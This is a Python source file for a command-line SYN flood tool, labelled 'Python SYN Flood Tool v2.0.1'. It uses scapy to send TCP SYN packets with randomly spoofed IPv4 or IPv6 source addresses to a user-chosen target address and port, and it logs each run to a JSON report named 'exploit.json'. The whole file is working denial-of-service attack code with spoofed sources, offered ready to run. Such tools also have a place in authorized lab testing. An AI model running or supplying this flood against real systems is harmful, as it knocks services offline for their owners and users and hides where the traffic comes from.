from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser
import json
import os

def save_results(result, file_path='report/exploit.json'):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    else:
        data = []

    data.append(result)

    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip

def randInt():
    return randint(1000, 9000)

def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("IPv4 Packets are sending ...")

    for _ in range(counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = int(dstPort)
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=0)
        total += 1

    stdout.write("\nTotal packets sent: %i\n" % total)
    return total

def SYN_Flood_v6(dstIP, dstPort, counter):
    total = 0
    print("IPv6 Packets are sending ...")

    for _ in range(counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IPv6()
        IP_Packet.src = RandIP6()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = int(dstPort)
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=0)
        total += 1

    stdout.write("\nTotal packets sent: %i\n" % total)
    return total

def main():
    parser = ArgumentParser()
    parser.add_argument('--target', '-t', help='target IP address')
    parser.add_argument('--port', '-p', help='target port number')
    parser.add_argument('--count', '-c', help='number of packets')
    parser.add_argument('--format', '-f', help='format of target (Can ignore, default use IPv4)')
    parser.add_argument('--version', '-v', action='version', version='Python SYN Flood Tool v2.0.1\n@EmreOvunc')
    parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"

    args = parser.parse_args()

    if args.target is not None:
        if args.port is not None:
            if args.count is None:
                print('[!] You did not use --count/-c parameter, so 1 packet will be sent..')
                packet_count = 1
            else:
                packet_count = int(args.count)

            if args.format == '6':
                total_sent = SYN_Flood_v6(args.target, args.port, packet_count)
            else:
                total_sent = SYN_Flood(args.target, args.port, packet_count)

            result = {
                "target": args.target,
                "port": args.port,
                "count": packet_count,
                "total_sent": total_sent,
                "format": "IPv6" if args.format == '6' else "IPv4"
            }

            save_results(result)
            print(f"Result saved to 'report/exploit.json'")

        else:
            print('[-] Please, use --port/-p to give target\'s port!')
            print('[!] Example: -p 445')
            print('[?] -h for help')
            exit()
    else:
        print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
                           [--count COUNT] [--version]
optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        target IP address
  --port PORT, -p PORT  target port number
  --count COUNT, -c COUNT
                        number of packets
  --version, -v         show program's version number and exit''')
        exit()

if __name__ == "__main__":
    main()